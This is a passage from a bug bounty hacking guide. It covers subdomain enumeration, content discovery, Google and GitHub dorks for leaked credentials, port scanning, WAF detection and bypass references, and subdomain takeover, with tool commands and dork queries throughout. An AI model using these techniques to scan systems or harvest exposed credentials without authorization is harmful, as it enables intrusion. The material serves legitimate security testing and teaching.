of subdomains. GitHub\nAlmost every developer uses GitHub to store their source code. Developers will\noften hard code private or hidden endpoint points in their source code. Scraping\nsubdomains from GitHub is an excellent way to find hidden endpoints that other\nmethods would miss. This can be accomplished by using the following tool by\ngwen001:\n● https://github.com/gwen001/github-search/blob/master/github-\nsubdomains.py\nFigure 42: GitHub subdomain enumeration tool\nGhostlulz AKA Alex Thomas\nPage | 92\nThis is an amazing technique and you should definitely incorporate it into your\nworkflow. Brute Force\nIntroduction\nBrute forcing is probably the most popular way to find subdomains. You might\nthink that you send a get requests to a bunch of subdomains and see which ones\nresolve but that’s wrong. DNS can be used to brute force subdomains without\nsending packets to your target. All you do is perform a DNS requests against a\nsubdomain if it resolves to an IP then you know it’s live. Gobuster\nThere are many tools that can perform subdomain brute forcing but I prefer to\nuse Gobuster. You should already have a few wordlists to use if not go back and\nreview the chapter on wordlists, remember your wordlist will make or break you\nin this phase. ● https://github.com/OJ/gobuster\nGhostlulz AKA Alex Thomas\nPage | 93\nFigure 43: Gobuster subdomain brute force\nNote that your results will only be as good as the wordlist you use. If you have\nplenty of time to spend then it is optimal to choose a large wordlist so you can\ncover everything. However, if you are trying to move quick you may have to limit\nthe size of your wordlist and rely more on other techniques. Conclusion\nSubdomain brute forcing is one of the most popular and best ways to find\nsubdomains. Just make sure you are using a good wordlist as the wrong wordlist\ncan cost you results. Ghostlulz AKA Alex Thomas\nPage | 94\nSubdomain Permutation\nOne of the best ways to find hidden assets is through the use of permutations. A\npermutation is a way a set of words can be rearranged. For example, if we have\nthe subdomain test.starbcuks.com and the words dev, stage, and production we\ncould come up with several possible subdomains. We would have dev-\ntest.starbucks.com, dev.test.starbucks.com, production-test.starbucks.com, and\nso on. All this can be done automatically with altdns:\n● https://github.com/infosec-au/altdns\nUsing altdns we can pass in a list of found subdomains and a list of words and\nthe tool will output a huge list of permutations. The tool can also resolve each\nnewly found subdomain to see if they are live:\naltdns -i found_subdomains.txt -o permutation_output -w words.txt -r -s\nresolved_output.txt\nFigure 44: Altdns subdomain permutations\nThis may take a while to run but this technique will generate a bunch of hidden\nassets you would have never found. Note that this technique should be\nperformed after you have gathered a list of subdomains it does no good to create\npermutations of subdomains if you have no subdomains. So, this should be\nperformed as the last step in your subdomain enumeration process. Ghostlulz AKA Alex Thomas\nPage | 95\nOther\nThere are a lot of other techniques and resources that people can use to find\nsubdomains. I can’t go in depth on every single one of them as that could be a\nbook in itself. However, most of the other techniques involve querying or scraping\nsome third-party resource for subdomains they know about. A small list of these\nresources can be found below:\n● Virus Total\n● Netcraft\n● DNSdumpster\n● Threat crowed\n● Shodan\n● Cencys\n● DNSdb\n● Pastebin\nThis list can go on forever. Note that the vast majority of these resources have\nbeen compiled into the most popular subdomain enumeration tools so there is no\nneed to manually do this process. You should be utilizing a tool that scrapes all\nthese resources for you. Tools\nAmass\nYou should already be familiar with amass as we used it in our horizontal\ncorrelation process. This tool can also be used in the vertical correlation phase to\nfind the subdomains of your target. Ghostlulz AKA Alex Thomas\nPage | 96\n● https://github.com/OWASP/Amass\nUse the following command to get a list of subdomains using amass:\namass enum -passive -d <Domain Name Here>\nFigure 45: Amass subdomain enumeration\nAmass will utilize a bunch of online resources to find subdomains. Most of these\nare third party vendors which they scrape or utilize their API to pull a list\nsubdomains. Knock.py\nThis tool seems to miss a lot of subdomains but I still like it because it shows the\nresponse status and the technology stack. This is very useful for quickly\nunderstanding each subdomain. ● https://github.com/guelfoweb/knock\nUse the following command to run the tool:\nknockpy.py <Domain Name Here>\nGhostlulz AKA Alex Thomas\nPage | 97\nFigure 46: Knock.py subdomain enumeration tool\nConclusion\nSubdomain enumeration is one of the most important steps in the recon process. There are numerous techniques but the main ones include gathering information\nmore third parties, brute forcing, forward DNS database, and subdomain\npermutations. Amass can be used to scrape all of the third-party resources. Gobuster should be used for brute forcing subdomains, and the tool Altdns\nshould be used for subdomain permutations. If you use all of these techniques\ncorrectly you should have a very thorough list of subdomains. Ghostlulz AKA Alex Thomas\nPage | 98\nDNS Resolutions\nDuring the subdomain enumeration process, you should have generated a large\nlist subdomains. In order to start probing these endpoints you need to know\nwhich ones are live. To do this we can perform a DNS lookup against a domain\nto see if it contains an A record. If it does then we know the subdomain is live. Most subdomain enumeration tools will do this automatically but other tools don’t\nperform any validation. If you have a list of subdomains you can use Massdns to\ndetermine which ones are live domains. ● https://github.com/blechschmidt/massdns\nThe tool is written in C and requires us to build it before we can use it. To do so\nrun the following command:\ngit install https://github.com/blechschmidt/massdns.git\ncd massdns\nmake\nNote that in order to parse out the live domains we will need to parse the tools\noutput. This can be done with a json parse, I will be using JQ for this. JQ is a\ncommand line json parser. ● https://github.com/stedolan/jq\nAnother thing to note is that you must also have a list of DNS resolvers for the\ntool to use. The most popular one is Googles “8.8.8.8”. If you have a large list\nyou may want to add more. The tool can be run with the following command:\nGhostlulz AKA Alex Thomas\nPage | 99\n./bin/massdns -r resolvers.txt -t A -o J subdomains.txt | jq\n'select(.resp_type==\"A\") | .query_name' | sort -u\nResolvers.txt should hold your list of DNS resolvers and subdomains.txt holds\nthe domains you want to check. This is then piped to JQ where we parse out all\ndomains that resolve to an IP. Next, we use the sort command to remove any\nduplicates.\n\nScreen shot\nWhen you’re dealing with thousands of targets it is much easier to scroll through\na bunch of screenshots than visiting each site manually. Just by looking at a\nscreen shot you can determine several things such as its technology, is it old,\ndoes it look interesting, is there login functionality, and much more. There have\nbeen several cases where browsing screen shots has led me directly to remote\ncode execution (RCE). When gather screenshots I generally use the tool\neyewitness:\n● https://github.com/FortyNorthSecurity/EyeWitness\nOnce you download and install the tool you can run it with the following\ncommand:\nPython3 EyeWitness.py -f subdomains.txt --web\nGhostlulz AKA Alex Thomas\nPage | 100\nFigure 47: Eyewitness screen shot tool\nThis will attempt to take a screenshot of each domain in the list that was passed\nto the tool. Once the tool is finished you can scroll through each of the screen\nshots to find interesting endpoints. Content Discovery\nIntroduction\nContent discovery is a vital process in the reconnaissance phase. Failing to\nperform this phase properly will result in lots of missed vulnerabilities. The main\npurpose behind content discovery is to find endpoints on a target domain. You\nare looking for things such as log files, config files, interesting technologies or\napplications, and anything else that is hosted on the website. Ghostlulz AKA Alex Thomas\nPage | 101\nFigure 48: Content discovery workflow flowchart\nSelf Crawl\nOne of the best ways to find endpoints on a target is to crawl the application. Crawling a website involves recursively visiting each link and saving each link on\na web page recursively. This is a great way to find endpoints but you should note\nyou probably won’t find any hidden endpoints this way. The tools that I had used\nin the past were no longer functioning correctly so I created by own tool to do\nthis. I will generally try to use tools that are publicly available but sometimes you\nhave to create your own. ● https://github.com/ghostlulzhacks/crawler/tree/master\nNote that crawling a large site may not be feasible as there could be millions of\nlinks within the application. For this reason, I generally don’t crawl deeper than 2\nlevels. The following command can be used to crawl a site. Ghostlulz AKA Alex Thomas\nPage | 102\npython3 crawler.py -d <URL> -l <Levels Deep to Crawl>\nFigure 49: Crawl website get URLs\nIf you find an alternative tool to use feel free to use it. The basic idea here is to\nget a list of URLs on a site. These URLs can then be inspected to find interesting\nendpoints, fingerprint technologies, and finding vulnerabilities. Wayback machine crawl data\nWe can perform active crawling ourselves but it may be easier to use third party\nvendors for this. The Wayback Machine is an archive of the entire internet. Basically, they go to every website and they crawl it while taking screenshots and\nlogging the data to a database. ● https://web.archive.org/\nThese endpoints can then be queried to pull down every path the site has ever\ncrawled as shown below:\nGhostlulz AKA Alex Thomas\nPage | 103\nFigure 50: Wayback machine URLS\nGoing to “https://web.archive.org/web/*/facebook.com/*” will pull down a list of\npaths that the Wayback machine has crawled. We can then use the filter to\nsearch for specific files such as anything that ends in “.bak” as those might\ncontain juicy backup information. Other interesting filters include:\n● .zip\n● .config\n● /admin/\n● /api/\nNot only can you use this data to find interesting files but you can also find\nvulnerabilities by looking at the data. For instance, if you see the path\n“example.com/?redirect=something.com” you can test for open redirects and\nSSRF vulnerabilities. If you see the GET parameter “msg=” you can test for XSS. The list can go on for days. Ghostlulz AKA Alex Thomas\nPage | 104\nSome people like using the web UI to pull a list of paths but I prefer to use the\ncommand line. I created a small script that can be used to pull a list of paths from\nthe Wayback Machine:\n● https://github.com/ghostlulzhacks/waybackMachine\nBefore you decide to crawl a website yourself check out the Wayback Machine. It\nmight save you a lot of time and effort by using other peoples crawled data. Once\nyou get the data start looking for interesting files and GET parameters that might\nbe vulnerable. Common crawl data\nJust like The Wayback Machine Common Crawl also regularly crawls the internet\nfor endpoints. Also, like the Wayback Machine this data is publicly available and\nwe can use it to get a list of endpoints on a site passively. ● http://commoncrawl.org/\nThe following script can be used to query the data provided by common crawl:\n● https://github.com/ghostlulzhacks/commoncrawl\nRun the following command to initiate the script:\npython cc.py -d <Domain>\nGhostlulz AKA Alex Thomas\nPage | 105\nFigure 51: Common crawl URLs\nThis will generate a huge list of endpoints dating all the way back to 2014. You\nwill definitely want to pipe the output to a file so you can analyze it later. Note that\nbecause some URLs date back to 2014 they may not exist anymore so don’t be\nalarmed if a large portion of these URLs don’t work. Directory brute force\nCrawling a website is a good way to find endpoints the administrator wants you\nto find but what about those hidden assets. This is where directory brute forcing\ncomes in. Depending on your wordlists you can find all kinds of interesting\nendpoints like backup files, core dumps, config files, and a whole lot more. There\nare plenty of directory brute force tools out there but I typically use the tool\ngobuster, you should be familiar with this tool from the subdomain enumeration\nchapter. ● https://github.com/OJ/gobuster\nNote that the results you get depend entirely on the wordlist you use. Circle back\nto the chapter on wordlists if you want some of the most popular wordlist used by\nprofessionals. Run the following command to start Gobbuster:\nGhostlulz AKA Alex Thomas\nPage | 106\n./gobuster dir -k -w <Wordlist> -u <URL>\nFigure 52: Gobuster directory brute force\nThe biggest thing to remember here is if you want good results use a good\nwordlist. Conclusion\nContent discovery can be performed passively or actively. The Wayback\nMachine and Common Crawl can both be utilized to find crawled endpoints of\nyour targets. These resources are nice because they are completely passive. You can also actively crawl the target endpoint yourself to gather real time\ninformation. Crawling is useful for finding public endpoints but what about hidden\nor misconfigured endpoints. Directory brute forcing is perfect for finding hidden\nendpoints just make sure your using a high-quality wordlist. When it comes to\nbrute forcing your wordlist is everything. Ghostlulz AKA Alex Thomas\nPage | 107\nInspecting JavaScript Files\nIntroduction\nA lot of modern-day front ends are built with JavaScript, this can cause traditional\ntooling to fail. For instance, while crawling a built with JavaScript you might find\nyourself missing a lot of endpoints. There are also other interesting things in\nJavaScript files such as AWS keys, S3 bucket endpoints, API keys, and much\nmore. To deal with applications that utilize JavaScript you need to use special\ntools and techniques. Link Finder\nLinkfinder is one of the best tools for parsing endpoints from JavaScript files. The\ntool works by using jsbeautifier with a list of regexes to find URLs. I will usually\nrun this tool if the self-crawl phase fails to return any results or if an application is\nbuilt in JavaScript. ● https://github.com/GerbenJavado/LinkFinder\nThe following command can be used to parse links from a JavaScript file:\npython linkfinder.py -i <JavaScript File> -o cli\nGhostlulz AKA Alex Thomas\nPage | 108\nFigure 53: Linkfinder parse URLS from JavaScript files\nJssearch\nJssearch is another JavaScript parser except this tool primarily used to find\nsensitive or interesting strings. For instance, developers will sometimes hard\ncode API keys, AWS credentials, and other sensitive information in JavaScript\nfiles. This information can easily be parsed out with the use of regexes. ● https://github.com/incogbyte/jsearch\nFigure 54: Jsearch regexes\nCurrently the tool only searches for a handful of interesting strings but you could\neasily have custom regexes to the following file:\n● https://github.com/incogbyte/jsearch/blob/master/regex_modules/regex_m\nodules.py\nGhostlulz AKA Alex Thomas\nPage | 109\nYou can run the tool with the following command, make sure your using python\n\n3.7 or above or the tool will throw errors:\npython3.7 jsearch.py -u https://starbucks.com -n Starbucks\nFigure 55: Jsearch parse URLs, API keys, and other information\nThis tool is really good when it comes to analyzing JavaScript files. Make sure to\nadd your own custom regexes to improve your results. Google Dorks\nIntroduction\nThe topic of Google dorks really deserves its own book as this topic is so large. A\nGoogle dork is a query used to search and filter search engine results. Google\ndorks can be used to find hidden assets, credentials, vulnerable endpoints, and\nmuch more. A huge list of interesting dorks can be found on the exploit-db\nwebsite. Ghostlulz AKA Alex Thomas\nPage | 110\n● https://www.exploit-db.com/google-hacking-database\nDork Basics\nThe first thing to know about Google dorks is that they aren't just limited to\nGoogle. Dorks work on the vast majority of search engines such as Bing, AOL,\nand yahoo. Depending on how thorough you want to be you may wish to utilize\nthe results of multiple search engines. One of the most used google dorks is the “site:” command, this can be used to\nfilter the search engine results so only a specific URL is shown. An example\nquery may look like:\nsite:<Domain Name>\nFigure 56: Site Google dork\nGhostlulz AKA Alex Thomas\nPage | 111\nAnother common dork is the “inurl:” and “intitle:” query. The inurl query is used to\nmatch a URL with a specific word and the intitle query will filter results who have\na specific title. ● https://gbhackers.com/latest-google-dorks-list/\nThere are a bunch more google dorks but I’m not going to talk about all of them,\nthe best way to learn them is to explore them yourself. Third Party Vendors\nOne of the main things I use Google dorks for is to locate third party vendors. Organizations utilize sites such as Trello, Pastebin, GitHub, Jira, and more in\ntheir daily operations. Using Google dorks, you can find these endpoints and\nsearch for sensitive information. There have been several instances where I have\nfound credentials stored on a public Trello board. A typical dork when looking for\nthird party vendors looks like:\nsite:<Third Party Vendor> <Company Name>\nGhostlulz AKA Alex Thomas\nPage | 112\nFigure 57: Trello Google dork\nA full list of third-party vendors can be found below credit goes to Prateek\nTiwari:\nName Dork Description\nCodepad site:codepad.co “Company Name” Codepad is an online\ncompiler/interpreter. You can\nsometimes find hard coded\ncredentials here. Scribd site:scribd.com “Company Name” Scribd is known for their\nbooks and E-books but you can\nsometimes find internal files\nuploaded by employees that\ncontain passwords\nNPM site:npmjs.com “Company Name” Use this to find NodeJS source\ncode used by a company\nNPM site:npm.runkit.com “Company Use this to find NodeJS source\nName” code used by a company\nGhostlulz AKA Alex Thomas\nPage | 113\nLibraries site:libraries.io “Company Name” Libraries.io is a web service\nIO that lists software\ndevelopment project\ndependencies and alerts\ndevelopers to new versions of\nthe software libraries they are\nusing. Coggle site:coggle.it “Company Name” Coggle is used to create mind\nmaps. You might be able to\nfind internal flow charts which\ncontain credentials\nPapaly site:papaly.com “Company Name” This site is used to save\nbookmarks and links. You can\nsometimes find internal links,\ndocuments, and credentials. Trello site:trello.com “Company Name” Trello is a web based Kanban\nboard. This is often used to\nfind credentials and internal\nlinks of organizations. Prezi site:prezi.com “Company Name” This site is used to make\npresentations and can\nsometimes contain internal\nlinks and credentials. Jsdeliver site:jsdelivr.net “Company Name” CDN for NPM and GitHub. Codepen site:codepen.io “Company Name” Codepen is an online tool for\ncreating/testing front end\ncode. You can sometimes find\nAPI keys and other credentials\nin here\nPastebin site:pastebin.com “Company Name” Pastebin is a site where people\nupload text documents\ntypically for sharing. You can\noften find internal documents\nand credentials in here. Hackers also use this site to\nshare database leaks. Repl site:repl.it “Company Name” Repl is an online compiler. You\ncan sometimes find hard coded\ncredentials in users scripts. I\nhave personally used this to\ncompromise a few targets. Gitter site:gitter.im “Company Name” Gitter is an open source\nmessaging platform. You can\nsometimes find private\nmessages containing\ncredentials, internal links, and\nother info. Ghostlulz AKA Alex Thomas\nPage | 114\nBitbucket site:bitbucket.org “Company Name” Bitbucket like GitHub is a place\nto store source code. You can\noften find hard coded\ncredentials and other\ninformation in here. Atlassian site:*.atlassian.net “Company This dork can be used to find\nName” confluence , Jira, and other\nproducts that can contain\nsensitive information\nGitlab Inurl:gitlab “Company Name” Gitlab like GitHub is used to\nstore source code. You can\noften find internal source code\nand other sensitive\ninformation here\nTable 4: Third party sites Google dorks\nI have personally used the “repl.it” dork on several occasions to find clear text\ncredentials stored in source code, these can sometimes bring you very easy wins\nwith a devastating impact. You should beware of false positives, just because\nyou see some results doesn’t mean they belong to your target. Make sure to\nanalyze the results to properly assess if they belong to your target or not. Content\nGoogle dorks can also be used to find content and endpoints on an application. You can search for specific file extensions with the “ext:” dork. Ghostlulz AKA Alex Thomas\nPage | 115\nFigure 58: Google dork to find PDF files\nThis can be used to find all kinds of things such as back up files, PDFs,\ndatabases, zip files, and anything else. Conclusion\nGoogle dorks can be used to find anything and everything about your target. Google dorks have been around for a long time and they don’t seem to be going\naway anytime soon. There are some people who solely rely on google dorks to\nfind their vulnerabilities. Exploit-db has a huge list of dorks that can be used to\nfind sensitive or vulnerable endpoints. Although exploit-db contains many\ninteresting dorks I often find myself searching for third party vendors for\ninteresting information. For this all you need is a list of third-party vendors and\nthe “site:” dork. Also remember that just because the word google is in google\ndorks doesn't mean you can’t use Bing, AOL, or any other search engine to\nperform your searches. Ghostlulz AKA Alex Thomas\nPage | 116\nSummary\nThe major techniques covered here include picking the right wordlist, subdomain\nenumeration and content discovery. These techniques should form the bases of\nyour recon methodology. The wordlist you choose will impact the results of your\nsubdomain enumeration phase and the content discovery phase so make sure to\npick a good one. If you only take one lesson from this phase it should be\nsubdomain enumeration. Getting the subdomain enumeration phase done right is\ncritical to succeeding, so don't go being lazy during this phase. There are also\nother techniques such as analyzing JavaScript files, utilizing google dorks, and\nmuch more. You should be spending a fair amount of time during the recon\nphase, the more assets and endpoints you can uncover the better your odds of\nfinding a vulnerability. Ghostlulz AKA Alex Thomas\nPage | 117\nChapter 8: Fingerprint Phase\nIntroduction\nThe reconnaissance phase is all about finding your targets assets and endpoints. After you find your targets assets you need to fingerprint them. The purpose of\nfingerprinting is to find out what technologies are running on your target’s assets. You want to know the technology stacks, version numbers, running services, and\nanything else that can be used to identify what's running on an endpoint. Figure 59: Fingerprinting workflow flowchart\nYour ability to properly fingerprint your targets assets will have a direct impact on\nthe vulnerabilities you find. For instance, if a new remote code execution (RCE)\nexploit comes out for WordPress you need to be able to identify every\nGhostlulz AKA Alex Thomas\nPage | 118\nWordPress application your target environment. You may also want to fingerprint\nfor SSH, RDP, VNC, and other login services so you can perform brute force\nattacks. The data collected during the fingerprint phase is what enables you to\nexcel during the exploitation phase. IP\nIntroduction\nDuring the reconnaissance we gathered CIDR ranges belonging to our target. IP\naddress were also gathered from the DNS resolutions of the target’s subdomains\nduring the subdomain enumeration phase. These are the two main ways of\nfinding IPs associated with an organization. Once you have a list of IPs you will\nwant to discover the ports and services running on that endpoint. This can be\ndone manually by scanning a target yourself or you can use the passive\napproach which utilizes third party data. Shodan\nShodan is the most popular resource for gathering port scan data. This service\nscans the entire internet on a daily basis and provides this data to its users. You\ncan use the service for free but I would highly recommend getting the paid\nversion so your results are not limited. ● https://www.shodan.io/\nGhostlulz AKA Alex Thomas\nPage | 119\nIf you have your targets CIDR range you can use that to query Shodan. This will\ndisplay all assets in that CIDR range that have an open port. net:<”CIDR,CIDR,CIDR”>\nFigure 60: Shodan CIDR search\nYou can also search via the organizations name. org:<”Organization Name”>\nGhostlulz AKA Alex Thomas\nPage | 120\nFigure 61: Shodan org search\nThese two queries will only return assets on your targets external network but\nwhat about companies that are hosted in the cloud. If your target has assets in\nthe cloud such as AWS or Gcloud then it will be impossible to search via a CIDR\nrange or the company’s name as they belong to someone else. One technique\nyou can use is to search for a company's SSL certificate. SSL certificates should\nhave the companies name in them so you can use this to find other assets\nbelonging to an organization. ssl:<”ORGANIZATION NAME”>\nGhostlulz AKA Alex Thomas\nPage | 121\nFigure 62: Shodan search by SSL cert name\nAs you can see, we found a bunch of assets that are using an SSL certificate\nfrom Starbucks. You can also see that there are 103 assets on AWS and 171 on\nAzure. This is interesting to note, you will learn in the exploitation phase that if we\ncan find an SSRF vulnerability on an endpoint hosted on a cloud provider we can\ntake over the company's entire cloud network. In addition to these techniques you will also want to search each IP address\nindividually to make sure you don't miss anything. For large targets this will be\nimpossible to do manually so you will need some tooling. Ghostlulz AKA Alex Thomas\nPage | 122\nCencys\nCensys does the same thing Shodan does it’s basically a Shodan clone. You\nmay think that these two providers provide the same results but that is false. I\noften find assets on Censys that aren't on Shodan and vice versa. You want to\nbe utilizing multiple resources and pooling the results together so you get a\ncomplete list of ports and services. ● https://censys.io/ipv4\nCensys has a free version and just like Shodan it limits the results returned. They\nalso have a paid version but it is fairly expensive and depending on your finances\nmay not be worth it. Figure 63: Censys search\nGhostlulz AKA Alex Thomas\nPage | 123\nIf you can afford the price tag you won’t be disappointed with the results, it’s a\ngreat service. Nmap\nEverybody knows what Nmap as it’s one of the first tools any offensive security\nprofessional uses. Nmap does a really good job when scanning a small range of\nhosts but if you are trying to scan a large organization it’s probably not the right\ntool. My advice is if your scanning a small set of IPs use Nmap. If your planning\nto scan thousands, hundreds of thousands, or millions of IPs then you will need\nto use a tool that is built for mass scanning. Nmap is really good at doing a\nthorough scan, so if you want to scan and enumerate every port on a machine\nuse Nmap. The only time I use Nmap is when I’m scanning one single host for\ncompleteness. Masscan\nNmap performs best when scanning a single or small range of IPs but what\nhappens when you need to scan 100,000 targets? Mass scanners are really\ngood at detecting a single port across a huge range of IPs.\n\nThe tool Masscan\nwas built to scan the entire internet in just a few hours so it should be able to\nscan a large organization with ease. ● https://github.com/robertdavidgraham/masscan\nsudo masscan -p<Port Here> <CIDR Range Here> --exclude <Exclude IP> --\nbanners -oX <Out File Name>\nGhostlulz AKA Alex Thomas\nPage | 124\nFigure 64: Masscan internet scan on port 80\nMake sure to enable banner grabbing as you can directly use that information to\nfind potential vulnerabilities. To search through the results, you can use grep or\nyou can use the web UI built by offensive security. ● https://github.com/offensive-security/masscan-web-ui\nFigure 65: Masscan web UI\nIf I’m in a hurry ill just grep for the information I want but if I have time, I always\nlike using the web UI. Its 100 times easier to understand and digest the\ninformation when its displayed in the browser. Ghostlulz AKA Alex Thomas\nPage | 125\nConclusion\nNo matter what target you’re going after you’re going to come across IP\naddresses so you need to know what to do. Your looking to uncover any open\nports while identifying the services behind them. In most cases it is easier to\nutilize third party scan data provided by companies like Shodan. This will allow\nyou to quickly gather all the data you need without having to send packets to\nyour target, everything is completely passive. However, sometimes you want to\nbe a little more thorough so you will have to manually scan your target. This can\nbe done using Nmap but if you have a large target range you will want to use\nsomething like masscan. When you’re done with this phase you should have a\nhuge list of open ports and services. The next step is to see if any of them have\nany known misconfigurations or vulnerabilities. Web Application\nIntroduction\nA company’s assets are going to mainly consists of IPs and domains. When\ndealing with domains or web applications we want to perform some additional\nfingerprinting. We want to know the technology stack, programming languages\nused, firewalls used, and more. Remember web applications can be found on\nboth IPs and domains, most people forgot about the IPs during this phase. Ghostlulz AKA Alex Thomas\nPage | 126\nWappalyzer\nWappalyzer is by far the best tool for identifying web technologies. Basically, the\ntool analyzes an applications source code using a bunch of regexes to find out\nwhat technologies its running. You can download the chrome extension which\ncan be used to identify websites you visit as shown below:\nFigure 66: Wappalyzer browser plugin\nThis is nice however this approach can’t be scaled. You would have to manually\nvisit each target application and write down their technologies. To get around this\nwe need a tool. ● https://github.com/vincd/wappylyzer\npython3 main.py analyze -u <URL HERE>\nGhostlulz AKA Alex Thomas\nPage | 127\nFigure 67: Wappalyzer python script\nThis tool can only scan one domain at a time but with a little bash scripting you\ncan create a wrapper script to scan multiple domains. This information will let you\nknow your targets exact technology stack. You will know what server, plugins,\nversion, and programing languages an application is using. If you know an\napplication is running WordPress version 2.0 you can use this information to find\nrelated vulnerabilities and misconfiguration. Firewall\nIt’s not uncommon to see an application protected by a web application firewall\n(WAF). Before you start throwing a bunch of XSS payloads at a target you should\ncheck to see if there is a WAF. ● https://github.com/EnableSecurity/wafw00f\nWafw00f <URL HERE>\nGhostlulz AKA Alex Thomas\nPage | 128\nFigure 68: wafw00f discover firewall brand\nAs you can see the site is behind the Kona Site Defender firewall. If you do\ndetect a WAF you will need to modify your payloads to bypass it. The hacking\ncommunity has been bypassing WAFs ever since the first WAF came out and\nmuch of it is documented. ● https://github.com/0xInfection/Awesome-WAF#known-bypasses\nIf you lookup Konsa Site Defender you will see several XSS bypasses available. Figure 69: Kona SiteDefender WAF bypass\nGhostlulz AKA Alex Thomas\nPage | 129\nThis information is extremely valuable and could be the difference between\nfinding something vs finding nothing. Conclusion\nIf your testing a web application it’s a good idea to see if it’s protected by a\nfirewall. Web application firewalls (WAFs) are designed to block malicious\nattacks such as XSS but they all seem to contain bypasses. If you discover an\napplication is behind a WAF you need to adjust your payloads so they are able to\nbypass the firewall. It does no good to spend hours testing for XSS if it’s getting\nblocked by a WAF, work smarter not harder. Summary\nAfter the reconnaissance phase you move into the fingerprinting phase. The\nwhole purpose of this phase is to determine your targets technology stack,\nexposed ports and services, firewalls, and anything else that can be used to\nidentify an endpoint. Fingerprinting IPs consists of port scans and banners grabs. This can be done passively using something like Shodan or actively with Nmap\nand masscan. In addition to fingerprinting IPs you will want to fingerprint web\napplications. Here you are looking to determine the applications technology\nstack. If a website is running WordPress version 2.0 you need to know about it. In addition to the technology stack you will also want to know if the endpoint is\nbehind a firewall. If your target is behind a firewall you can properly prepare your\npayloads to bypass it. The information gathered in this phase feed directly to the\nGhostlulz AKA Alex Thomas\nPage | 130\nexploitation phase. As a result, failing to properly perform this phase will greatly\nhinder your end results. Ghostlulz AKA Alex Thomas\nPage | 131\nSection 3: Exploitation Phase\nIntroduction\nThe exploitation phase is the final phase. The reconnaissance phase is all about\nfinding assets, the fingerprinting phase is all about determining what's running on\neach asset and the exploitation phase is about hacking your targets assets. Ghostlulz AKA Alex Thomas\nPage | 132\nChapter 9: Exploitation Easy Wins\nIntroduction\nWhen searching for vulnerabilities I always start out looking for low hanging fruit. I want quick and easy wins that have really good payouts. I’m looking to\nmaximize my payout while minimizing my time spent looking for bugs. I would\nrather spend 10 minutes searching for a bug than 10 hours. Note you want to pay special attention to the sections on subdomain takeover,\nGitHub, and cloud services. I use those three techniques month after month to\nfind vulnerabilities they are reliable, easy to find, and can sometimes have insane\npayouts. Subdomain Takeover\nIntroduction\nSearching for subdomain takeovers is one of the easiest vulnerabilities you can\nfind and it normally pays fairly well. A subdomain takeover occurs when a domain\nis pointing to another domain (CNAME) that no longer exists. If you don’t know\nwhat a CNAME DNS record is you should go look it up now. If an attacker were\nto register that non existing domain then the targets subdomain would now point\nto your domain effectively giving you full control over the target’s subdomain. What makes this vulnerability so interesting is that you can be safe one minute\nand a single DNS change can make you vulnerable the next minute. Ghostlulz AKA Alex Thomas\nPage | 133\nSubdomain Takeover\nYou should be searching for subdomain takeovers on a daily basis. Just because\nyou checked your target yesterday doesn't mean they are safe today. Administrators are constantly changing things and a single DNS change can\nmake a company vulnerable to this bug. Before you can check for subdomain\ntakeover you need to get a list of your target’s subdomains, this should have\nbeen done during the recon phase. Once you have a list of subdomains checking\nfor this vulnerability should only take about 5 minutes with the following tool:\n● https://github.com/haccer/subjack\n./subjack -w <Subdomain List> -o results.txt -ssl -c fingerprints.json\nFigure 70: Subjack subdomain take over search\nLooks like there is a possible subdomain takeover on trace-psdev.starbucks.com. The next step is to see where this domain is pointing to so we can try to take it\nover. dig <Domain Here>\nGhostlulz AKA Alex Thomas\nPage | 134\nFigure 71: DNS lookup\nNotice the CNAME record is pointing to s00174atww2twsps.trafficmanager.net ,\nthis is the domain we want to register. If we can register this domain then we can\ntake over the trace-psdev.starbucks.com domain because its pointing to this. This subdomain is running on traffic manager which is a part of azure. So, you go\nto azure, register this domain and you’re done. Figure 72: Traffic manager register domain\nGhostlulz AKA Alex Thomas\nPage | 135\nIn this case the subdomain already exists so it was a false positive but if it didn't\nexist, we would have gotten subdomain hijacking vulnerability. Not that this\nexplains how to take over traffic manager but there are lots of other hosting\nproviders such as AWS, GitHub, Tumblr, and the list goes on. Each of these\nservices will be slightly different as they each have their own process for\nregistering domains. The following page should be utilized if you have any\nquestions on how to take over a specific service:\n• https://github.com/EdOverflow/can-i-take-over-xyz\nConclusion\nSubdomain takeover is one of the easiest high impact vulnerabilities you can\nsearch for. As long as you have a list of subdomains checking for this\nvulnerability is a matter of running a command. Administrators are constantly\nchanging DNS setting so a company may be safe one day and vulnerable the\nnext because of this it’s a good idea to constantly check for this vulnerability. GitHub\nIntroduction\nWhen performing your initial recon on an organization don’t forget about GitHub. GitHub is used by developers to maintain and share their code, most of the time\nthey end up sharing much more though. Most of the organizations I come across\nhave a public GitHub which can contain a tun of use full information. I have\nGhostlulz AKA Alex Thomas\nPage | 136\npersonally popped boxes using only information gained from a GitHub account. Depending on the size of the company you could literally spend a week or more\nlooking for exposures on GitHub. GitHub Dorks\nYou probably know what google dorks are but what are GitHub dorks. GitHub\ndorks are basically the same thing as google dorks. A dork is used to find specific\ninformation in a sea of information. It helps us narrow down the search to exactly\nwhat we want. We can match on file extensions, file names, or a specific set or\nwords. This can be very handy when searching for sensitive files, API keys,\npasswords, and a lot more. We can use dorks to find sensitive files that developers might have accidentally\nuploaded. For instance, one time I was performing an external pentest against\ncompany and I was able to use GitHub dorks to find an exposed bash history file\nwhich had SSH passwords. This was easily done by submitting the following\ndork:\nfilename:.bash_history DOMAIN-NAME\nGhostlulz AKA Alex Thomas\nPage | 137\nFigure 73: GitHub dork to find exposed bash history files\nPeople are always uploading sensitive files to GitHub, it's a gold mine. It's also a\ngood idea to look for exposed passwords, tokens, and api keys, usernames. Often, I will search for these words followed by the company name as shown\nbelow:\nGhostlulz AKA Alex Thomas\nPage | 138\nFigure 74: GitHub dork\nUsernames are often associated with passwords and api keys. As shown above\nsomeone is leaking their secret key. If this was an engagement, I would use that\nkey to login to their application. A good list of these dorks can be found below:\n● https://github.com/techgaun/github-dorks/blob/master/github-dorks.txt\nCompany GitHub\nInstead of using GitHub dorks to find exposures you might want to go directly to\nthe source. To do this you must find the companies GitHub page and from there\nGhostlulz AKA Alex Thomas\nPage | 139\nyou can locate all their developers and monitor their accounts. Not all companies\nhave a public GitHub page but you can do a google search to find out. Figure 75: GitHub company page\nOnce you find a company's page you want to get a list of people that are\nassociated with the company. This can be done by clicking on the “people” tab. Ghostlulz AKA Alex Thomas\nPage | 140\nFigure 76: GitHub company employees\nNow you will need to manually go through each one and look for exposures. That's why this process can take so long. Facebook has 184 people and looking\nthrough each one can be boring and take a long time. However, if there are a lot\nof people then there is a greater chance someone uploaded something they\nshouldn't have. You should be 